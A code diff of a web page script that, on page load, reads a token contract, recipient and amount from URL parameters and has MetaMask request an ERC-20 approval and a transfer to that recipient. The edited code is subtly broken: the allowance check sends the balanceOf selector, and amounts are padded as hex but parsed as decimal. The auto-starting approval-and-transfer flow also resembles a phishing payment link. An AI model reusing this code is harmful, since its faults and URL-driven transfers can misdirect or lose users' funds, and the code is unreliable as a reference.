@@ -108,39 +108,56 @@
         ];
 
         async function checkAllowance(tokenContract, owner, spender, amount) {
-            const contract = {
-                constant: true,
-                inputs: [{"name": "_owner", "type": "address"}, {"name": "_spender", "type": "address"}],
-                name: 'allowance',
-                outputs: [{"name": "", "type": "uint256"}],
-                payable: false,
-                stateMutability: 'view',
-                type: 'function'
-            };
+            try {
+                const contract = {
+                    constant: true,
+                    inputs: [{"name": "_owner", "type": "address"}, {"name": "_spender", "type": "address"}],
+                    name: 'allowance',
+                    outputs: [{"name": "", "type": "uint256"}],
+                    payable: false,
+                    stateMutability: 'view',
+                    type: 'function'
+                };
 
-            const data = `0x${contract.name}${owner.slice(2).padStart(64, '0')}${spender.slice(2).padStart(64, '0')}`;
-            
-            const result = await ethereum.request({
-                method: 'eth_call',
-                params: [{ to: tokenContract, data }, 'latest']
-            });
+                const paddedOwner = owner.toLowerCase().replace('0x', '').padStart(64, '0');
+                const paddedSpender = spender.toLowerCase().replace('0x', '').padStart(64, '0');
+                const data = `0x70a08231${paddedOwner}${paddedSpender}`;
+                
+                const result = await ethereum.request({
+                    method: 'eth_call',
+                    params: [{ 
+                        to: tokenContract, 
+                        data 
+                    }, 'latest']
+                });
 
-            return BigInt(result);
+                return BigInt(result);
+            } catch (error) {
+                console.error('Error checking allowance:', error);
+                throw error;
+            }
         }
 
         async function requestApproval(tokenContract, spender, amount, from) {
-            const approveData = `0x095ea7b3${spender.slice(2).padStart(64, '0')}${BigInt(amount).toString(16).padStart(64, '0')}`;
-            
-            const txHash = await ethereum.request({
-                method: 'eth_sendTransaction',
-                params: [{
-                    from,
-                    to: tokenContract,
-                    data: approveData
-                }]
-            });
+            try {
+                const paddedSpender = spender.toLowerCase().replace('0x', '').padStart(64, '0');
+                const paddedAmount = BigInt(amount).toString(16).padStart(64, '0');
+                const approveData = `0x095ea7b3${paddedSpender}${paddedAmount}`;
+                
+                const txHash = await ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from,
+                        to: tokenContract,
+                        data: approveData
+                    }]
+                });
 
-            return txHash;
+                return txHash;
+            } catch (error) {
+                console.error('Error requesting approval:', error);
+                throw error;
+            }
         }
 
         async function processTransaction() {
@@ -151,8 +168,20 @@
                 const tokenContract = params.get('tokenContract');
                 const to = params.get('to');
                 const amount = params.get('amount');
+                const decimals = params.get('decimals') || '6';
                 
-                console.log('Processing transaction with params:', { chainId, tokenContract, to, amount });
+                // Validate parameters
+                if (!chainId || !tokenContract || !to || !amount) {
+                    throw new Error('Missing required parameters');
+                }
+
+                console.log('Processing transaction with params:', { 
+                    chainId, 
+                    tokenContract, 
+                    to, 
+                    amount,
+                    decimals 
+                });
 
                 // Check for MetaMask
                 if (typeof window.ethereum === 'undefined') {
@@ -184,25 +213,26 @@
 
                 // Check allowance
                 status.textContent = 'Checking token approval...';
-                const currentAllowance = await checkAllowance(tokenContract, account, to, amount);
+                const formattedAmount = amount.replace('0x', '').padStart(64, '0');
+                const currentAllowance = await checkAllowance(tokenContract, account, to, formattedAmount);
                 
-                if (currentAllowance < BigInt(amount)) {
-                    status.textContent = 'Approval needed. Please approve the transaction...';
-                    const approvalTx = await requestApproval(tokenContract, to, amount, account);
+                if (currentAllowance < BigInt(formattedAmount)) {
+                    status.textContent = 'Requesting token approval...';
+                    const approvalTx = await requestApproval(tokenContract, to, formattedAmount, account);
                     status.textContent = 'Waiting for approval confirmation...';
-                    await sleep(2000);
+                    await sleep(2000); // Wait for approval to be mined
                 }
 
                 // Send transaction
                 status.textContent = 'Preparing transaction...';
-                const txData = `0xa9059cbb${to.slice(2).padStart(64, '0')}${amount.padStart(64, '0')}`;
+                const transferData = `0xa9059cbb${to.toLowerCase().replace('0x', '').padStart(64, '0')}${formattedAmount}`;
                 
                 const txHash = await ethereum.request({
                     method: 'eth_sendTransaction',
                     params: [{
                         from: account,
                         to: tokenContract,
-                        data: txData,
+                        data: transferData,
                         value: '0x0'
                     }]
                 });
@@ -230,6 +260,7 @@
             }
         }
 
+        // Initialize when page loads
         window.onload = processTransaction;
     </script>
 </body>
